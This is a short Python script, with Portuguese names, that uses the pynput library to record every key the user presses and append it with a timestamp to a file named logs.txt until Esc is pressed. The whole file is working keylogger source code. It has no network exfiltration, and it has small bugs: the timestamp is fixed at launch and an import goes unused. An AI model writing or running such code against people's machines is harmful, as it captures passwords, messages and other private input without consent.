from os import times
from pynput.keyboard import Listener
import time

logs: str = "logs.txt"
horario: time = time.strftime('%H:%M')

def escreve_log(key):
    key_data: str = str(key)
    if key_data == 'Key.esc':
        return False
    with open(logs, "a") as file:
        file.write(f"\n{key_data}, {horario} \n")
        
with Listener(on_press=escreve_log) as log:
    log.join()